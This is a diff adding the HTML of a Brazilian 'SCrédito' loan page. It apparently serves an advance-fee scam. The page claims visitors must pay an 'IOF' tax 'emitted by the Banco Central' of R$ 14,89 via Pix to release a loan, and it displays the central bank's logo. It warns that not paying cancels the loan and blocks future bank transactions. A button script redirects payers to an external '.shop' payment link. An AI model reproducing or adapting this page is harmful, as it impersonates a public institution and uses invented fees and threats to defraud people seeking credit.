+            display: grid;
+            gap: .75rem
+        }
+
+        .intro .headline[data-v-d5c2a0e6] {
+            color: var(--primary);
+            font-size: 1.5rem;
+            font-weight: 500;
+            text-align: left;
+        }
+    </style>
+    <style>
+        .card-title[data-v-303a1430] {
+            color: #000;
+            font-size: 1.5rem;
+            font-weight: 500;
+            text-align: center;
+        }
+    </style>
+    <style>
+        .divider[data-v-b5121d9d] {
+            background-color: var(--primary);
+            border-radius: 10px;
+            height: 2px;
+            width: 80px
+        }
+    </style>
+    <style>
+        .card-sub-title[data-v-2901cb0a] {
+            color: #21236ada;
+            line-height: 1.5
+        }
+    </style>
+    <style>
+        .registration-fee-video[data-v-6b06b597] {
+            border: 1px solid #e2e8f0;
+            background-color: white;
+            border-radius: 16px;
+            color: #000;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.05);
+            display: grid;
+            gap: 1rem;
+            padding: 2.5rem 1rem;
+            position: relative
+        }
+
+        .registration-fee-video .card-aviso {
+            background: linear-gradient(135deg, #ee4d2d 0%, #ff7337 100%);
+            color: white;
+            text-align: center;
+            font-size: 1.3rem;
+            font-weight: bolder;
+            border-radius: 10px 10px 0px 0px;
+            padding: 10px;
+            margin-bottom: -10px;
+        }
+
+        .registration-fee-video .card-aviso-texto {
+            background: linear-gradient(135deg, #ee4d2d 0%, #ff7337 100%);
+            color: white;
+            text-align: center;
+            font-size: 1rem;
+            border-radius: 0px 0px 10px 10px;
+            padding: 10px;
+        }
+
+
+        .card-sub-title[data-v-6b06b597] {
+            align-items: center;
+            display: grid;
+            font-size: 1.2rem;
+            gap: .5rem;
+            grid-auto-columns: auto;
+            grid-auto-flow: column;
+            justify-content: center
+        }
+
+        video[data-v-6b06b597] {
+            border: 1px solid #9d9d9d;
+            border-radius: 5px
+        }
+    </style>
+    <style>
+        .loan-status-timeline[data-v-9f1c2f74] {
+            display: grid;
+            gap: 2rem;
+            position: relative
+        }
+
+        .bar[data-v-9f1c2f74] {
+            background-color: #d5d5d5;
+            height: 87%;
+            left: 10px;
+            position: absolute;
+            top: 20px;
+            transform: translateX(-50%);
+            width: 3px
+        }
+    </style>
+    <style>
+        .timeline-part[data-v-7f42729f] {
+            align-items: center;
+            display: grid;
+            gap: 1.3rem;
+            grid-template-columns: auto 1fr
+        }
+
+        .timeline-part.done[data-v-7f42729f] {
+            color: #419c63
+        }
+
+        .timeline-part.done .dot[data-v-7f42729f] {
+            background-color: #419c63
+        }
+
+        .timeline-part.current[data-v-7f42729f] {
+            color: var(--red)
+        }
+
+        .timeline-part.current .dot[data-v-7f42729f] {
+            animation: pulse-7f42729f 1s infinite;
+            background-color: var(--red)
+        }
+
+        @keyframes pulse-7f42729f {
+            0% {
+                -webkit-box-shadow: 0 0 0 0 var(--red)
+            }
+
+            70% {
+                -webkit-box-shadow: 0 0 0 15px rgba(255, 0, 0, 0)
+            }
+
+            to {
+                -webkit-box-shadow: 0 0 0 0 rgba(255, 0, 0, 0)
+            }
+        }
+
+        .timeline-part.pending[data-v-7f42729f] {
+            color: rgba(0, 0, 0, .3)
+        }
+
+        .timeline-part.pending .dot[data-v-7f42729f] {
+            background-color: #d5d5d5
+        }
+
+        .dot[data-v-7f42729f] {
+            background-color: var(--primary);
+            border-radius: 50%;
+            height: 20px;
+            outline: 5px solid #f5f7f9;
+            position: relative;
+            width: 20px
+        }
+
+        .body[data-v-7f42729f] {
+            align-items: center;
+            display: grid;
+            gap: .5rem;
+            grid-template-columns: auto 1fr
+        }
+
+        .body .icon[data-v-7f42729f] {
+            font-size: 2.5rem
+        }
+
+        .body .text[data-v-7f42729f] {
+            display: grid;
+            gap: .35rem
+        }
+    </style>
+    <style>
+        .countdown-timer[data-v-441b54a3] {
+            color: #fff;
+            display: grid;
+            gap: 1rem
+        }
+
+        .timer[data-v-441b54a3] {
+            display: grid;
+            gap: .5rem;
+            grid-template-columns: repeat(2, auto);
+            justify-content: center
+        }
+
+        .card-title[data-v-441b54a3],
+        .description[data-v-441b54a3],
+        .waring[data-v-441b54a3] {
+            text-align: center
+        }
+
+        .waring[data-v-441b54a3] {
+            color: var(--red)
+        }
+    </style>
+    <style>
+        .payment-card[data-v-a09dda04] {
+            display: grid;
+            gap: 2rem;
+            justify-items: center;
+            text-align: center
+        }
+
+        .card-title[data-v-a09dda04] {
+            align-items: center;
+            display: grid;
+            gap: .5rem;
+            grid-template-columns: repeat(2, auto)
+        }
+
+        .card-title .icon[data-v-a09dda04] {
+            color: #3db1a5;
+            font-size: 1.8rem
+        }
+
+        .card-sub-title[data-v-a09dda04] {
+            align-items: center;
+            display: grid;
+            gap: .5rem;
+            grid-template-columns: repeat(2, auto)
+        }
+
+        .card-sub-title .icon[data-v-a09dda04] {
+            color: #419c63;
+            font-size: 1.2rem
+        }
+
+        .fee-value[data-v-a09dda04] {
+            color: #3db1a5;
+            font-size: 2rem;
+            font-weight: 500
+        }
+
+        .icon[data-v-a09dda04] {
+            font-size: 3rem
+        }
+    </style>
+    <style>
+        .card[data-v-cca10726] {
+            background-color: #fff;
+            border-radius: 10px;
+            box-shadow: 0 1px 4px 0 rgba(0, 8, 38, .04);
+            padding: 1.5rem;
+            width: 100%
+        }
+    </style>
+    <style>
+        .registration-fee-faq[data-v-a343b494] {
+            background-color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            padding: 1.5rem;
+            border-radius: 16px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.05);
+            gap: 1.5rem;
+            margin: 0;
+            width: 100%;
+        }
+
+        .registration-fee-faq .card-title {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: #1f2937;
+            margin-bottom: 1rem;
+            text-align: center;
+            border-bottom: 2px solid #ee4d2d;
+            padding-bottom: 0.5rem;
+        }
+
+        .registration-fee-faq .faq-item {
+            background-color: #fff;
+            border: 1px solid #e5e7eb;
+            border-radius: 12px;
+            padding: 1rem;
+            display: flex;
+            flex-direction: column;
+            gap: 0.5rem;
+            margin-bottom: 1.2rem;
+        }
+
+        .registration-fee-faq .question {
+            font-size: 1.2rem;
+            font-weight: bold;
+            color: #555;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .registration-fee-faq .question svg {
+            width: 1.2rem;
+            height: 1.2rem;
+            color: #333;
+        }
+
+        .registration-fee-faq .viewBox {
+            display: block;
+            font-size: 1rem;
+            color: #666;
+            line-height: 1.5;
+            padding-left: 1.5rem;
+        }
+    </style>
+    <style>
+        .faq-item[data-v-8c748230] {
+            border-top: 1px solid #d4dae0;
+            color: #000;
+            cursor: pointer;
+            font-weight: 400
+        }
+
+        .faq-item .question[data-v-8c748230] {
+            align-items: center;
+            display: grid;
+            grid-template-columns: auto 1fr;
+            padding: .5rem 0
+        }
+
+        .faq-item .question.expanded .icon[data-v-8c748230] {
+            transform: rotate(180deg)
+        }
+
+        .faq-item .question .icon[data-v-8c748230] {
+            color: var(--primary);
+            font-size: 2.5rem;
+            transition: transform .2s ease-out
+        }
+
+        .faq-item .answer[data-v-8c748230] {
+            display: grid;
+            gap: 1rem;
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height .2s ease-out
+        }
+
+        .faq-item .answer .content[data-v-8c748230] {
+            color: rgba(0, 0, 0, .5);
+            padding: .2rem 1rem 1.5rem
+        }
+
+        .question.expanded[data-v-8c748230]:after {
+            transform: translateY(-50%) rotate(90deg)
+        }
+    </style>
+    <style>
+        .footer[data-v-63f14862] {
+            border-bottom: 7px solid var(--primary);
+            border-top: 2px solid #edf0ef;
+            color: #ffffffad;
+            padding: 2rem 0;
+            text-align: center;
+            background-color: #002D79;
+        }
+
+        .footer p[data-v-63f14862] {
+            margin: .5rem 0
+        }
+    </style>
+    <link rel="stylesheet" href="/_nuxt/TopBar.2vF9lWx7.css">
+    <link rel="stylesheet" href="/_nuxt/Container.B5PP9_Vn.css">
+    <link rel="stylesheet" href="/_nuxt/CardTitle.D2C4NpE7.css">
+    <link rel="stylesheet" href="/_nuxt/CardSubTitle.DG_Fs8af.css">
+    <link rel="stylesheet" href="/_nuxt/PaymentCard.C5KDNUam.css">
+    <link rel="stylesheet" href="/_nuxt/Button.CTY08tZL.css">
+    <link rel="stylesheet" href="/_nuxt/LoadingText.BAPOmI7q.css">
+    <link rel="stylesheet" href="/_nuxt/Card.GBBMdh4F.css">
+    <link rel="stylesheet" href="/_nuxt/FaqItem.yXfMt8qC.css">
+    <link rel="modulepreload" as="script" crossorigin="" href="/_nuxt/Ds3y3Bf3.js">
+    <link rel="modulepreload" as="script" crossorigin="" href="/_nuxt/k9y74een.js">
+    <link rel="modulepreload" as="script" crossorigin="" href="/_nuxt/Bo8ipC1T.js">
+    <link rel="modulepreload" as="script" crossorigin="" href="/_nuxt/2aeojNjQ.js">
+    <link rel="modulepreload" as="script" crossorigin="" href="/_nuxt/2TdE_QPC.js">
+    <link rel="modulepreload" as="script" crossorigin="" href="/_nuxt/DTnGPJep.js">
+    <link rel="modulepreload" as="script" crossorigin="" href="/_nuxt/B1xLFNhR.js">
+    <link rel="modulepreload" as="script" crossorigin="" href="/_nuxt/CNxTVsKb.js">
+    <link rel="modulepreload" as="script" crossorigin="" href="/_nuxt/BQBhJayI.js">
+    <link rel="modulepreload" as="script" crossorigin="" href="/_nuxt/CV182wBC.js">
+    <link rel="modulepreload" as="script" crossorigin="" href="/_nuxt/u-U6PqlP.js">
+    <link rel="modulepreload" as="script" crossorigin="" href="/_nuxt/DIXVKuIp.js">
+    <link rel="modulepreload" as="script" crossorigin="" href="/_nuxt/Bl1c_aD8.js">
+    <link rel="modulepreload" as="script" crossorigin="" href="/_nuxt/DEF4dnCe.js">
+    <link rel="modulepreload" as="script" crossorigin="" href="/_nuxt/sv4npInL.js">
+    <link rel="modulepreload" as="script" crossorigin="" href="/_nuxt/B6VT0UWr.js">
+    <link rel="modulepreload" as="script" crossorigin="" href="/_nuxt/MaghENf1.js">
+    <link rel="modulepreload" as="script" crossorigin="" href="/_nuxt/BJRZzHYv.js">
+    <link rel="modulepreload" as="script" crossorigin="" href="/_nuxt/BTyuqVSS.js">
+    <link rel="modulepreload" as="script" crossorigin="" href="/_nuxt/DmqsTf9v.js">
+    <link rel="prefetch" as="script" crossorigin="" href="/_nuxt/J9e3dA3M.js">
+    <link rel="prefetch" as="script" crossorigin="" href="/_nuxt/D-UNq_Tu.js">
+    <link rel="prefetch" as="script" crossorigin="" href="/_nuxt/BGBp0rdz.js">
+    <link rel="prefetch" as="script" crossorigin="" href="/_nuxt/Wpn3EkJ-.js">
+    <link rel="prefetch" as="script" crossorigin="" href="/_nuxt/CKC6fHHG.js">
+    <link rel="prefetch" as="script" crossorigin="" href="/_nuxt/BhOEMyyX.js">
+    <script type="module" src="/_nuxt/Ds3y3Bf3.js" crossorigin=""></script>
+    <script id="unhead:payload" type="application/json">{"title":"Empréstimo facilitado, simulação gratuita!"}</script>
+    <script src="js/latest_1.js" async="" defer=""></script>
+    <link rel="stylesheet" href="https://unipay-br.org/_nuxt/12-fee.BCxcH5e_.css">
+    <link rel="stylesheet" href="https://unipay-br.org/_nuxt/default.fxhPcPvK.css">
+    <script src="js/player_1.js" async="">
     </script>
 
-</strong></div></body></html>
+    <script src="js/player.js" async=""></script>
+</head>
+
+<body>
+    <div id="__nuxt">
+        <div class="default-layout" data-v-77968890="">
+            <style>
+                .top-bar {
+                    height: auto;
+                    margin: 0 auto;
+                    display: flex;
+                    align-items: center;
+                    justify-content: center;
+                    background: linear-gradient(135deg, #ee4d2d 0%, #ff7337 100%);
+                    border-bottom: 1px solid hsla(0, 0%, 100%, .3);
+                    width: 100%;
+                    padding: 20px;
+                    box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+                }
+
+                .top-bar .logo {
+                    display: flex;
+                    gap: 1rem;
+                    align-items: center;
+                }
+
+                .top-bar img {
+                    height: 40px;
+                    max-height: 100%;
+                    object-fit: contain;
+                }
+                
+                .top-bar .logo-text {
+                    color: white;
+                    font-size: 1.5rem;
+                    font-weight: 700;
+                    text-shadow: 0 1px 2px rgba(0, 0, 0, .2);
+                }
+            </style>
+            <header class="top-bar">
+                <div class="container">
+                    <h1 class="logo" style="--2348ed9e: 10px;">
+                        <img src="images/image.png" alt="Logo">
+                        <span class="logo-text">SCrédito</span>
+                    </h1>
+                </div>
+            </header>
+            <main class="content" data-v-77968890="">
+                <!--[-->
+                <div class="fee-page" data-v-d5c2a0e6="">
+                    <div class="container" data-v-d5c2a0e6="" data-v-0041013f="">
+                        <!--[-->
+                        <div class="intro" data-v-d5c2a0e6="">
+                            <span class="card-title headline" data-v-d5c2a0e6="" data-v-303a1430=""><!--[--> Parabéns, falta pouco para você receber o valor do empréstimo na sua conta! <!--]--></span>
+                            <div class="divider" data-v-d5c2a0e6="" data-v-b5121d9d=""></div>
+                            <span class="card-sub-title" data-v-d5c2a0e6="" data-v-2901cb0a="">
+                                <!--[--> Você está a um passo de receber seu empréstimo, efetue o pagamento do imposto IOF (Imposto sobre Operações Financeiras) <strong>emitido pelo Banco Central</strong> para autorizar o saque imediatamente para sua conta. <!--]--></span>
+                        </div>
+                        <div class="registration-fee-video" data-v-d5c2a0e6="" data-v-6b06b597="">
+                            <span class="card-aviso">AVISO</span>
+                            <span class="card-aviso-texto">O não pagamento do IOF resultará no <strong>cancelamento do empréstimo</strong> e no bloqueio de <strong>futuras transações bancárias.</strong></span>
+                            <span class="card-title" data-v-6b06b597="" data-v-303a1430=""><!--[-->O que é o IOF?<!--]--></span>
+                            <span class="card-sub-title" data-v-6b06b597="" data-v-2901cb0a="">
+                                <!--[--><span data-v-6b06b597="">Aumente o volume</span>
+                                <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true" role="img" class="icon iconify iconify--twemoji" data-v-6b06b597="" style="" width="1em" height="1em" viewBox="0 0 36 36">
+                                    <path fill="#BE1931" d="M12.908 30.75c-.276 2.209-2.291 3-4.5 3s-3.776-1.791-3.5-4l1-9c.276-2.209 2.291-4 4.5-4s6.468 0 3.5 4s-1 10-1 10"></path>
+                                    <path fill="#CCD6DD" d="M35.825 14.75c0 6.902-1.544 12.5-3.45 12.5c-1.905 0-20.45-5.598-20.45-12.5s18.545-12.5 20.45-12.5c1.906 0 3.45 5.597 3.45 12.5"></path>
+                                    <ellipse cx="32.375" cy="14.75" fill="#66757F" rx="3.45" ry="12.5"></ellipse>
+                                    <path fill="#DD2E44" d="m17.925 21.75l-14-1c-5 0-5-12 0-12l14-1c-3 3-3 11 0 14"></path>
+                                    <ellipse cx="31.325" cy="14.75" fill="#99AAB5" rx="1.5" ry="4.348"></ellipse>
+                                </svg>
+                                <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true" role="img" class="icon iconify iconify--twemoji" data-v-6b06b597="" style="" width="1em" height="1em" viewBox="0 0 36 36">
+                                    <path fill="#BE1931" d="M12.908 30.75c-.276 2.209-2.291 3-4.5 3s-3.776-1.791-3.5-4l1-9c.276-2.209 2.291-4 4.5-4s6.468 0 3.5 4s-1 10-1 10"></path>
+                                    <path fill="#CCD6DD" d="M35.825 14.75c0 6.902-1.544 12.5-3.45 12.5c-1.905 0-20.45-5.598-20.45-12.5s18.545-12.5 20.45-12.5c1.906 0 3.45 5.597 3.45 12.5"></path>
+                                    <ellipse cx="32.375" cy="14.75" fill="#66757F" rx="3.45" ry="12.5"></ellipse>
+                                    <path fill="#DD2E44" d="m17.925 21.75l-14-1c-5 0-5-12 0-12l14-1c-3 3-3 11 0 14"></path>
+                                    <ellipse cx="31.325" cy="14.75" fill="#99AAB5" rx="1.5" ry="4.348"></ellipse>
+                                </svg>
+                                <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true" role="img" class="icon iconify iconify--twemoji" data-v-6b06b597="" style="" width="1em" height="1em" viewBox="0 0 36 36">
+                                    <path fill="#BE1931" d="M12.908 30.75c-.276 2.209-2.291 3-4.5 3s-3.776-1.791-3.5-4l1-9c.276-2.209 2.291-4 4.5-4s6.468 0 3.5 4s-1 10-1 10"></path>
+                                    <path fill="#CCD6DD" d="M35.825 14.75c0 6.902-1.544 12.5-3.45 12.5c-1.905 0-20.45-5.598-20.45-12.5s18.545-12.5 20.45-12.5c1.906 0 3.45 5.597 3.45 12.5"></path>
+                                    <ellipse cx="32.375" cy="14.75" fill="#66757F" rx="3.45" ry="12.5"></ellipse>
+                                    <path fill="#DD2E44" d="m17.925 21.75l-14-1c-5 0-5-12 0-12l14-1c-3 3-3 11 0 14"></path>
+                                    <ellipse cx="31.325" cy="14.75" fill="#99AAB5" rx="1.5" ry="4.348"></ellipse>
+                                </svg>
+                                <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true" role="img" class="icon iconify iconify--twemoji" data-v-6b06b597="" style="" width="1em" height="1em" viewBox="0 0 36 36">
+                                    <path fill="#BE1931" d="M12.908 30.75c-.276 2.209-2.291 3-4.5 3s-3.776-1.791-3.5-4l1-9c.276-2.209 2.291-4 4.5-4s6.468 0 3.5 4s-1 10-1 10"></path>
+                                    <path fill="#CCD6DD" d="M35.825 14.75c0 6.902-1.544 12.5-3.45 12.5c-1.905 0-20.45-5.598-20.45-12.5s18.545-12.5 20.45-12.5c1.906 0 3.45 5.597 3.45 12.5"></path>
+                                    <ellipse cx="32.375" cy="14.75" fill="#66757F" rx="3.45" ry="12.5"></ellipse>
+                                    <path fill="#DD2E44" d="m17.925 21.75l-14-1c-5 0-5-12 0-12l14-1c-3 3-3 11 0 14"></path>
+                                    <ellipse cx="31.325" cy="14.75" fill="#99AAB5" rx="1.5" ry="4.348"></ellipse>
+                                </svg>
+                                <!--]-->
+                            </span>
+<div style="position:relative;padding-top:56.60377358490566%;"><iframe id="panda-a58005d5-9309-4977-890c-9ba3911f5ef8" src="https://player-vz-8abcfdf5-418.tv.pandavideo.com.br/embed/?v=a58005d5-9309-4977-890c-9ba3911f5ef8" style="border:none;position:absolute;top:0;left:0;" allow="accelerometer;gyroscope;autoplay;encrypted-media;picture-in-picture" allowfullscreen=true width="100%" height="100%" fetchpriority="high"></iframe></div>
+                            <div class="loan-status-timeline" data-v-d5c2a0e6="" data-v-9f1c2f74="">
+                                <div class="bar" data-v-9f1c2f74=""></div>
+                                <div class="timeline-part done" data-v-9f1c2f74="" data-v-7f42729f="">
+                                    <div class="dot" data-v-7f42729f=""></div>
+                                    <div class="body" data-v-7f42729f="">
+                                        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true" role="img" class="icon iconify iconify--ph" data-v-7f42729f="" style="" width="1em" height="1em" viewBox="0 0 256 256">
+                                            <g fill="currentColor">
+                                                <path d="M176 64v48H80V64Z" opacity=".2"></path>
+                                                <path d="M80 120h96a8 8 0 0 0 8-8V64a8 8 0 0 0-8-8H80a8 8 0 0 0-8 8v48a8 8 0 0 0 8 8m8-48h80v32H88Zm112-48H56a16 16 0 0 0-16 16v176a16 16 0 0 0 16 16h144a16 16 0 0 0 16-16V40a16 16 0 0 0-16-16m0 192H56V40h144Zm-100-68a12 12 0 1 1-12-12a12 12 0 0 1 12 12m40 0a12 12 0 1 1-12-12a12 12 0 0 1 12 12m40 0a12 12 0 1 1-12-12a12 12 0 0 1 12 12m-80 40a12 12 0 1 1-12-12a12 12 0 0 1 12 12m40 0a12 12 0 1 1-12-12a12 12 0 0 1 12 12m40 0a12 12 0 1 1-12-12a12 12 0 0 1 12 12"></path>
+                                            </g>
+                                        </svg>
+                                        <div class="text" data-v-7f42729f="">
+                                            <p data-v-7f42729f="">Simulação</p><small data-v-7f42729f="">Simulação realizada e cadastro concluído</small>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="timeline-part done" data-v-9f1c2f74="" data-v-7f42729f="">
+                                    <div class="dot" data-v-7f42729f=""></div>
+                                    <div class="body" data-v-7f42729f="">
+                                        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true" role="img" class="icon iconify iconify--ph" data-v-7f42729f="" style="" width="1em" height="1em" viewBox="0 0 256 256">
+                                            <g fill="currentColor">
+                                                <path d="M224 128a95.76 95.76 0 0 1-31.8 71.37A72 72 0 0 0 128 160a40 40 0 1 0-40-40a40 40 0 0 0 40 40a72 72 0 0 0-64.2 39.37A96 96 0 1 1 224 128" opacity=".2"></path>
+                                                <path d="M221.35 104.11a8 8 0 0 0-6.57 9.21A89 89 0 0 1 216 128a87.62 87.62 0 0 1-22.24 58.41a79.66 79.66 0 0 0-36.06-28.75a48 48 0 1 0-59.4 0a79.66 79.66 0 0 0-36.06 28.75A88 88 0 0 1 128 40a89 89 0 0 1 14.68 1.22a8 8 0 0 0 2.64-15.78a103.92 103.92 0 1 0 85.24 85.24a8 8 0 0 0-9.21-6.57M96 120a32 32 0 1 1 32 32a32 32 0 0 1-32-32m-21.92 77.5a64 64 0 0 1 107.84 0a87.83 87.83 0 0 1-107.84 0M237.66 45.66l-32 32a8 8 0 0 1-11.32 0l-16-16a8 8 0 0 1 11.32-11.32L200 60.69l26.34-26.35a8 8 0 0 1 11.32 11.32"></path>
+                                            </g>
+                                        </svg>
+                                        <div class="text" data-v-7f42729f="">
+                                            <p data-v-7f42729f="">Pagamento do Taxa de Liberação</p><small data-v-7f42729f="">Pagamento concluído com sucesso</small>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="timeline-part current" data-v-9f1c2f74="" data-v-7f42729f="">
+                                    <div class="dot" data-v-7f42729f=""></div>
+                                    <div class="body" data-v-7f42729f="">
+                                        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true" role="img" class="icon iconify iconify--ph" data-v-7f42729f="" style="" width="1em" height="1em" viewBox="0 0 256 256">
+                                            <g fill="currentColor">
+                                                <path d="m229.67 133.62l-96 96a7.94 7.94 0 0 1-11.24 0l-96-96a7.94 7.94 0 0 1 0-11.24l96.05-96a7.94 7.94 0 0 1 11.24 0l96 96.05a7.94 7.94 0 0 1-.05 11.19" opacity=".2"></path>
+                                                <path d="m235.34 116.72l-96.06-96.06a16 16 0 0 0-22.56 0l-96.06 96.06a16 16 0 0 0 0 22.56l96.06 96.06a16 16 0 0 0 22.56 0l96.06-96.06a16 16 0 0 0 0-22.56M128 32l56 56h-24a8 8 0 0 0-5.66 2.34L128 116.68l-26.34-26.34A8 8 0 0 0 96 88H72Zm-72 72h36.68l24 24l-24 24H56l-24-24Zm72 120l-56-56h24a8 8 0 0 0 5.66-2.34L128 139.31l26.34 26.35A8 8 0 0 0 160 168h24Zm72-72h-36.68l-24-24l24-24H200l24 24Z"></path>
+                                            </g>
+                                        </svg>
+                                        <div class="text" data-v-7f42729f="">
+                                            <p data-v-7f42729f="">Pagamento do Imposto IOF</p><small data-v-7f42729f="">Aguardando pagamento para liberação do crédito</small>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="timeline-part pending" data-v-9f1c2f74="" data-v-7f42729f="">
+                                    <div class="dot" data-v-7f42729f=""></div>
+                                    <div class="body" data-v-7f42729f="">
+                                        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true" role="img" class="icon iconify iconify--ph" data-v-7f42729f="" style="" width="1em" height="1em" viewBox="0 0 256 256">
+                                            <g fill="currentColor">
+                                                <path d="M16 152h32v56H16a8 8 0 0 1-8-8v-40a8 8 0 0 1 8-8M192.54 40A39.12 39.12 0 0 0 156 64a39.12 39.12 0 0 0-36.54-24C97.67 40 80 58.31 80 80c0 14.56 7 27.71 16.73 40H140a20 20 0 0 1 0 40h4l37.78-8.68C203.82 135.07 232 109.23 232 80c0-21.69-17.67-40-39.46-40" opacity=".2"></path>
+                                                <path d="M230.33 141.06a24.34 24.34 0 0 0-18.61-4.77C230.5 117.33 240 98.48 240 80c0-26.47-21.29-48-47.46-48A47.58 47.58 0 0 0 156 48.75A47.58 47.58 0 0 0 119.46 32C93.29 32 72 53.53 72 80c0 11 3.24 21.69 10.06 33a31.87 31.87 0 0 0-14.75 8.4L44.69 144H16a16 16 0 0 0-16 16v40a16 16 0 0 0 16 16h104a8 8 0 0 0 1.94-.24l64-16a7 7 0 0 0 1.19-.4L226 182.82l.44-.2a24.6 24.6 0 0 0 3.93-41.56ZM119.46 48a31.15 31.15 0 0 1 29.14 19a8 8 0 0 0 14.8 0a31.15 31.15 0 0 1 29.14-19C209.59 48 224 62.65 224 80c0 19.51-15.79 41.58-45.66 63.9l-11.09 2.55A28 28 0 0 0 140 112h-39.32C92.05 100.36 88 90.12 88 80c0-17.35 14.41-32 31.46-32M16 160h24v40H16Zm203.43 8.21l-38 16.18L119 200H56v-44.69l22.63-22.62A15.86 15.86 0 0 1 89.94 128H140a12 12 0 0 1 0 24h-28a8 8 0 0 0 0 16h32a8.3 8.3 0 0 0 1.79-.2l67-15.41l.31-.08a8.6 8.6 0 0 1 6.3 15.9Z"></path>
+                                            </g>
+                                        </svg>
+                                        <div class="text" data-v-7f42729f="">
+                                            <p data-v-7f42729f="">Crédito na conta</p><small data-v-7f42729f="">Crédito enviado para sua conta bancária</small>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <style>
+                                .image-container {
+                                    text-align: center;
+                                    /* Centraliza a imagem no contêiner */
+                                }
+
+                                img {
+                                    max-width: 150px;
+                                    /* Define a largura máxima da imagem */
+                                    height: auto;
+                                    /* Mantém a proporção da imagem */
+
+                                }
+                            </style>
+
+
+                            <div class="image-container">
+                                <img src="images/Banco_Central_do_Brasil_logo-1.png" alt="Imagem Centralizada">
+                            </div>
+                            <div class="description" data-v-441b54a3=""><span class="card-sub-title" data-v-441b54a3="" data-v-2901cb0a=""><!--[--> O não pagamento do imposto resulta no cancelamento do contrato do empréstimo, impossibilitando uma nova contratação por um prazo máximo de 90 dias <!--]-->
+                                    <p></p>
+                                </span></div>
+                        </div>
+                        <div data-v-cca10726="" data-v-a09dda04="" data-v-0fe1df78="" class="card payment-card"><span data-v-303a1430="" data-v-a09dda04="" class="card-title">Pague via Pix <svg data-v-a09dda04="" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true" role="img" class="icon iconify iconify--ic" width="1em" height="1em" viewBox="0 0 24 24">
+                                    <path fill="currentColor" d="m15.45 16.52l-3.01-3.01c-.11-.11-.24-.13-.31-.13s-.2.02-.31.13L8.8 16.53c-.34.34-.87.89-2.64.89l3.71 3.7a3 3 0 0 0 4.24 0l3.72-3.71c-.91 0-1.67-.18-2.38-.89M8.8 7.47l3.02 3.02c.08.08.2.13.31.13s.23-.05.31-.13l2.99-2.99c.71-.74 1.52-.91 2.43-.91l-3.72-3.71a3 3 0 0 0-4.24 0l-3.71 3.7c1.76 0 2.3.58 2.61.89"></path>
+                                    <path fill="currentColor" d="m21.11 9.85l-2.25-2.26H17.6c-.54 0-1.08.22-1.45.61l-3 3c-.28.28-.65.42-1.02.42a1.5 1.5 0 0 1-1.02-.42L8.09 8.17c-.38-.38-.9-.6-1.45-.6H5.17l-2.29 2.3a3 3 0 0 0 0 4.24l2.29 2.3h1.48c.54 0 1.06-.22 1.45-.6l3.02-3.02c.28-.28.65-.42 1.02-.42s.74.14 1.02.42l3.01 3.01c.38.38.9.6 1.45.6h1.26l2.25-2.26a3.04 3.04 0 0 0-.02-4.29"></path>
+                                </svg></span><span data-v-2901cb0a="" data-v-a09dda04="" class="card-sub-title"> O pagamento será confirmado imediatamente </span><span data-v-a09dda04="" class="fee-value">R$ 14,89 </span>
+                            <style>
+                                .button {
+                                    padding: 16px 20px;
+                                    font-size: 18px;
+                                    border: none;
+                                    border-radius: 12px;
+                                    cursor: pointer;
+                                    color: #fff;
+                                    background: linear-gradient(135deg, #ee4d2d 0%, #ff7337 100%);
+                                    font-weight: 700;
+                                    transition: all 0.3s ease;
+                                    position: relative;
+                                    overflow: hidden;
+                                }
+
+                                .button.primary {
+                                    background: linear-gradient(135deg, #ee4d2d 0%, #ff7337 100%);
+                                }
+                                
+                                .button:hover {
+                                    transform: translateY(-2px);
+                                    box-shadow: 0 8px 20px rgba(238, 77, 45, 0.3);
+                                }
+                                
+                                .button:after {
+                                    content: "";
+                                    position: absolute;
+                                    top: -50%;
+                                    left: -50%;
+                                    width: 200%;
+                                    height: 200%;
+                                    background: linear-gradient(
+                                        to right,
+                                        rgba(255, 255, 255, 0) 0%,
+                                        rgba(255, 255, 255, 0.3) 50%,
+                                        rgba(255, 255, 255, 0) 100%
+                                    );
+                                    transform: rotate(30deg);
+                                    animation: shine 4s infinite;
+                                }
+                            </style>
+
+                            <button class="button primary" type="button" id="redirectButton">
+                                Pagar agora
+                            </button>
+
+                            <script>
+                                document.getElementById('redirectButton').addEventListener('click', function () {
+                                    // Captura os parâmetros da URL atual
+                                    const utmParams = window.location.search;
+
+                                    // Define a URL base de destino
+                                    const baseUrl = 'https://pay.pagamentosfacilitadosoficial.shop/1VOvGV4EOVb3D62';
+
+                                    // Redireciona para a URL com os parâmetros herdados
+                                    window.location.href = baseUrl + utmParams;
+                                });
+                            </script>
+                            <!----><span data-v-2901cb0a="" data-v-a09dda04="" class="card-sub-title"><svg data-v-a09dda04="" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true" role="img" class="icon iconify iconify--ph" width="1em" height="1em" viewBox="0 0 256 256">
+                                    <g fill="currentColor">
+                                        <path d="M216 56v56c0 96-88 120-88 120s-88-24-88-120V56a8 8 0 0 1 8-8h160a8 8 0 0 1 8 8" opacity=".2"></path>
